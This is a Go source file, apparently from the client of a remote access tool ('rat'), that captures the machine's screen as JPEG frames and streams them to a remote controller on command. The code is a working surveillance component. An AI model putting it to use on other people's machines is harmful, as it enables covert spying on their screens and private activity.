package main

import (
	"bytes"
	"image/jpeg"
	"rat/client/screen"
	"rat/common"
	"time"
)

var screenStream bool

type ScreenPacket struct {
	IncomingPacket
	OutgoingPacket
}

func (packet ScreenPacket) GetHeader() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Read(c *Connection) error {
	run, err := c.ReadBool()

	if run {
		screenStream = true
		go ScreenStream()
	} else {
		screenStream = false
	}

	return err
}

func (packet ScreenPacket) Write(c *Connection) error {
	screen.QueryMonitors()

	var w bytes.Buffer

	jpeg.Encode(&w, screen.Capture(screen.Monitors[0]), &jpeg.Options{
		Quality: 75,
	})

	c.WriteInt(int32(len(w.Bytes())))
	c.Write(w.Bytes())

	return nil
}

// ScreenStream goroutine
func ScreenStream() {
	for screenStream {
		Queue <- ScreenPacket{}
		time.Sleep(common.ScreenStreamWait)
	}
}
